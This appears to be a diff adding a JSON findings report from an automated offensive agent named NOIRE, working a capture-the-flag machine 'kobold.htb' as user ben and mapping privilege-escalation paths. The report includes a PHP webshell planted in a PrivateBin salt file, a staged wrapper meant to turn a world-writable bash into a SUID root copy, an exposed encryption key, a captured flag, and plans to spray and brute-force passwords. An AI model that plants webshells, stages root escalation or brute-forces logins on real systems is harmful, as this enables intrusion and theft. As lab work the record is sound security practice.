@@ -1,0 +1,216 @@
+{
+  "meta": {
+    "agent": "NOIRE",
+    "target": "kobold.htb",
+    "target_ip": "10.129.7.164",
+    "date": "2026-03-21T23:00:00Z",
+    "operation": "Kobold"
+  },
+  "objective": "Complete post-access investigation as ben. Map full local attack surface for privilege escalation.",
+  "current_access": {
+    "user": "ben",
+    "uid": 1001,
+    "gid": 1001,
+    "groups": ["ben", "operator"],
+    "shell": "/bin/bash",
+    "shell_quality": "stable",
+    "access_method": "SSH ed25519 key",
+    "ssh_command": "ssh -i /home/kali/.ssh/kobold_ben ben@10.129.7.164",
+    "sudo": "password required, no passwordless rules",
+    "home": "/home/ben"
+  },
+  "system_profile": {
+    "os": "Ubuntu 24.04.4 LTS (Noble Numbat)",
+    "kernel": "6.8.0-106-generic x86_64",
+    "hostname": "kobold.htb",
+    "init": "systemd",
+    "default_shell": "/bin/sh -> dash",
+    "container_host": true,
+    "docker_version": "containerd + dockerd",
+    "running_containers": 1,
+    "audit": "auditd + laurel"
+  },
+  "high_value_findings": [
+    {
+      "id": "HVF-01",
+      "title": "/usr/bin/bash is world-writable (mode 0777)",
+      "evidence": "ls -la /usr/bin/bash: -rwxrwxrwx, modified 2026-03-21 20:45:53",
+      "impact": "Any user can replace bash binary. If root executes bash, attacker payload runs as root.",
+      "confidence": "HIGH",
+      "notes": "Real bash still installed (md5 matches /tmp/bash_orig). Wrapper payload at /tmp/bash_wrapper ready to deploy."
+    },
+    {
+      "id": "HVF-02",
+      "title": "Arcane Docker Management supports X-API-Key auth",
+      "evidence": "X-API-Key header returns 'invalid API key' instead of 'auth required'",
+      "impact": "Valid API key grants full Docker management as root",
+      "confidence": "HIGH"
+    },
+    {
+      "id": "HVF-03",
+      "title": "alice is in docker group",
+      "evidence": "getent group docker: docker:x:111:alice",
+      "impact": "alice can run containers with host root mount = root",
+      "confidence": "HIGH"
+    },
+    {
+      "id": "HVF-04",
+      "title": "PrivateBin TLS private key readable",
+      "evidence": "/privatebin-data/certs/key.pem readable by operator group",
+      "impact": "MITM potential on all 3 HTTPS vhosts",
+      "confidence": "MEDIUM"
+    },
+    {
+      "id": "HVF-05",
+      "title": "Arcane ENCRYPTION_KEY exposed in systemd unit",
+      "evidence": "Environment=ENCRYPTION_KEY=\"Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E=\" in /etc/systemd/system/arcane.service",
+      "impact": "Used for data encryption. May be related to JWT secret derivation in v1.13.0.",
+      "confidence": "MEDIUM"
+    }
+  ],
+  "privesc_leads": [
+    {
+      "rank": 1,
+      "path": "World-writable bash replacement -> SUID bash",
+      "evidence": "/usr/bin/bash is 0777. Wrapper at /tmp/bash_wrapper creates SUID copy. /tmp/bash_orig is real bash backup.",
+      "complexity": "LOW (once trigger identified)",
+      "confidence": "HIGH",
+      "blocker": "No known mechanism triggers root to execute /usr/bin/bash. All cron scripts use /bin/sh (dash). No systemd services reference bash.",
+      "next_steps": [
+        "Investigate root's crontab (not readable as ben)",
+        "Research if Arcane Go binary spawns bash for container exec",
+        "Check if Docker operations trigger bash",
+        "Deploy wrapper and monitor for SUID creation"
+      ]
+    },
+    {
+      "rank": 2,
+      "path": "Arcane API auth -> Docker container escape",
+      "evidence": "POST /api/auth/login works (rejects bad creds). X-API-Key header supported. Full Docker management via frontend.",
+      "complexity": "MEDIUM",
+      "confidence": "HIGH",
+      "blocker": "No valid credentials found. admin/admin, ENCRYPTION_KEY as password/API-key all rejected.",
+      "next_steps": [
+        "Search for API keys or passwords in PrivateBin paste content",
+        "Research Arcane v1.13.0 default credentials or JWT derivation",
+        "Download and analyze full JS bundle for hidden API endpoints",
+        "Try to brute common passwords for admin user"
+      ]
+    },
+    {
+      "rank": 3,
+      "path": "alice lateral -> docker group",
+      "evidence": "alice in docker group (gid=111) and operator group (gid=37). Home dir mode 700, not readable.",
+      "complexity": "MEDIUM",
+      "confidence": "MEDIUM",
+      "blocker": "No alice credentials found. Home directory inaccessible.",
+      "next_steps": [
+        "Check PrivateBin pastes for alice credentials",
+        "Check Arcane user database for alice account",
+        "Credential reuse from any discovered password"
+      ]
+    },
+    {
+      "rank": 4,
+      "path": "PrivateBin paste content -> credential discovery",
+      "evidence": "Paste dirs /privatebin-data/data/12/ and /4e/ exist but mode 700 nobody:82",
+      "complexity": "HIGH",
+      "confidence": "LOW",
+      "blocker": "Cannot read paste content as ben. Need container-level access.",
+      "next_steps": [
+        "Find way to trigger webshell in salt.php inside container",
+        "Read paste content via Arcane if we get Docker access"
+      ]
+    }
+  ],
+  "credentials_and_secrets": [
+    {
+      "type": "encryption_key",
+      "value": "Q3PbC9fpq/tPZ2waXI9+grmc8ualF7ITF5izX5rsk+E=",
+      "source": "/etc/systemd/system/arcane.service",
+      "context": "Arcane ENCRYPTION_KEY environment variable",
+      "status": "not_valid_as_api_key_or_password"
+    },
+    {
+      "type": "tls_private_key",
+      "value": "[RSA PEM key]",
+      "source": "/privatebin-data/certs/key.pem",
+      "context": "Used by nginx for all 3 HTTPS vhosts",
+      "status": "readable_by_operator"
+    },
+    {
+      "type": "webshell",
+      "value": "<?php if(isset($_GET[\"c\"])){system($_GET[\"c\"]);}",
+      "source": "/privatebin-data/data/salt.php",
+      "context": "Prepended to PrivateBin salt file",
+      "status": "not_triggerable_via_web"
+    },
+    {
+      "type": "user_flag",
+      "value": "f1057924705f1ae16e6b57d59b439aeb",
+      "source": "/home/ben/user.txt",
+      "status": "captured"
+    }
+  ],
+  "misconfigurations": [
+    {
+      "item": "/usr/bin/bash mode 0777",
+      "detail": "World-writable bash binary",
+      "impact": "CRITICAL — direct privesc path"
+    },
+    {
+      "item": "PrivateBin data dir mode 777",
+      "detail": "/privatebin-data/data/ is world-writable",
+      "impact": "Can write files into container data volume"
+    },
+    {
+      "item": "TLS key readable by operator",
+      "detail": "/privatebin-data/certs/key.pem",
+      "impact": "MITM on HTTPS vhosts"
+    }
+  ],
+  "anomalies": [
+    "Pre-staged privesc artifacts in /tmp/ (bash_wrapper, bash_orig, test.php, base_procs)",
+    "Port 38963 — unidentified Go HTTP service on localhost",
+    "PrivateBin bd/b5/ contains PHP files and symlink placed by ben in prior session",
+    "No obvious trigger for root to execute /usr/bin/bash despite it being the apparent intended vector"
+  ],
+  "oracle_flags": [
+    "Find the bash trigger — what makes root execute /usr/bin/bash?",
+    "Crack Arcane auth — try password spray, research v1.13.0 JWT derivation from ENCRYPTION_KEY",
+    "Get alice credentials — check PrivateBin pastes, Arcane user database",
+    "Identify port 38963 — may expose additional API surface",
+    "PrivateBin paste content locked — need container access to read dirs 12/ and 4e/"
+  ],
+  "services": {
+    "external": [
+      {"port": 22, "service": "OpenSSH", "user": "root"},
+      {"port": 80, "service": "nginx", "user": "root/www-data", "notes": "redirect to HTTPS"},
+      {"port": 443, "service": "nginx", "user": "root/www-data", "notes": "3 vhosts"},
+      {"port": 3552, "service": "Arcane Docker Mgmt v1.13.0", "user": "root", "notes": "Go+SvelteKit"}
+    ],
+    "localhost": [
+      {"port": 6274, "service": "MCPJam Inspector", "user": "ben", "notes": "Node.js"},
+      {"port": 8080, "service": "Docker proxy -> PrivateBin", "user": "root", "notes": "172.17.0.2:8080"},
+      {"port": 38963, "service": "Unknown Go HTTP", "user": "unknown", "notes": "Returns plain 404"},
+      {"port": 53, "service": "systemd-resolved", "user": "systemd+"}
+    ]
+  },
+  "tools_executed": [
+    "noire_system_profile",
+    "noire_sudo_check",
+    "noire_suid_scan",
+    "noire_service_enum",
+    "noire_cron_inspect",
+    "noire_writable_paths",
+    "manual_ssh_enumeration"
+  ],
+  "evidence_refs": [
+    "/home/kali/Desktop/IRONTHREAD/boxes/Kobold/shared/raw/noire_system_profile_20260321T225548Z.txt",
+    "/home/kali/Desktop/IRONTHREAD/boxes/Kobold/shared/raw/noire_sudo_check_20260321T225550Z.txt",
+    "/home/kali/Desktop/IRONTHREAD/boxes/Kobold/shared/raw/noire_suid_scan_20260321T225550Z.txt",
+    "/home/kali/Desktop/IRONTHREAD/boxes/Kobold/shared/raw/noire_service_enum_20260321T225555Z.txt",
+    "/home/kali/Desktop/IRONTHREAD/boxes/Kobold/shared/raw/noire_cron_inspect_20260321T225556Z.txt",
+    "/home/kali/Desktop/IRONTHREAD/boxes/Kobold/shared/raw/noire_writable_paths_20260321T225557Z.txt"
+  ]
+}
